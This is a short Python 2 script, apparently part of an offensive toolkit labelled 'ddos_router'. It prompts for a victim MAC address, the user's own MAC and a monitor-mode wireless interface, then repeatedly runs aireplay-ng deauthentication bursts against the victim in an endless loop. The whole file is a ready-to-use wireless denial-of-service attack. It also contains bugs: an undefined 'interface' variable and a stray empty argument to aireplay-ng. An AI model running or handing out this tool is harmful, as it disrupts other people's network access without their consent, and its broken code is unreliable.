# -*- coding: UTF-8 -*-

import subprocess
import time
import sys

end = '\033[0m'
yellow = '\033[33m'
red="\033[0;31m"
green="\033[0;32m"
brown="\033[0;33m"
blue="\033[0;34m"
pur="\033[0;35m" 

def __start__():
	if sys.platform == 'linux2':
		pass
	else:
		print
		print red+"[-] This modules only run as linux platform"+end
		print
		sys.exit()
	print
	print green+"[+] This script powered by aircrack-ng"
	print
	print "[+] Please enter mac address victim"
	print "    e.x: 00:00:00:00:00:00"+end
	print
	mac_victim = raw_input(brown+'ddos_router > mac_victim >>> '+end)
	print
	print green+"[+] Please enter your mac address"
	print "    e.x: 00:00:00:00:00:00"+end
	print
	mac_local = raw_input('ddos_router > mac_local >>> ')
	print
	print green+"[+] Please enter a interface wireless monitor"
	print "    e.x: wlan0mon"+end
	print
	interfacer = raw_input(brown+'ddos_router > interface >>> '+end)
	print
	print green+"[+] DDOS Attack started !"+end
	print
	print brown+" Mac Victim: ",green,mac_victim,end
	print brown+" Mac Local: ",green,mac_local,end
	print brown+" Interface: ",green,interface,end
	print
	while True:
		try:
			s = subprocess.call(('aireplay-ng', '--deauth', '50', '-a', mac_victim, '-h', mac_local, '', interfacer))
			time.sleep(20)
		except KeyboardInterrupt:
			print
			sys.exit()





